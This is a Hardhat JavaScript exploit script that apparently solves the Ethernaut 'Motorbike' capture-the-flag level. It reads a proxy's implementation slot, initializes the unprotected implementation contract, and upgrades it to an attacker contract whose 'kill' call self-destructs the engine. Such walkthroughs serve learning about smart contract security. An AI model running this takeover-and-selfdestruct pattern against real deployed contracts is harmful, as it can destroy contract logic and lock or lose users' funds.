const { expect } = require("chai")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let power, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x559Ca385F486553681943bF4E69Db6055A398b63"
    let target = await ethers.getContractAt("Engine", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "MotorbikeAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy()

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    // Find implementation address
    console.log("Proxy Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }
    res = await ethers.provider.getStorageAt(
        instanceAddress,
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    )
    let implAddress = "0x" + res.substring(26)
    console.log(`Impl address: ${implAddress}, len: ${implAddress.length}`)
    const targetImpl = await ethers.getContractAt("Engine", implAddress)
    console.log(`Contract address: ${res}`)
    // Initialize implementation contract
    tx = await targetImpl.initialize()
    await tx.wait(1)
    console.log("Implementation Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(targetImpl.address, i)
        console.log(`Slot ${i}: ${res}`)
    }
    // Upgrade
    let payload = attackerContract.interface.encodeFunctionData("kill")
    console.log(`Payload: ${payload}`)
    tx = await targetImpl.upgradeToAndCall(attackerContract.address, payload)
    await tx.wait(1)

    // Check
    try {
        power = await target.horsePower()
        res = true
    } catch (err) {
        res = false
    }
    if (res == false) {
        console.log(`${symbols.success} Engine is ded!`)
    } else {
        console.log(
            `${
                symbols.error
            } Engine replied with ${power.toString()} horsepower`
        )
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
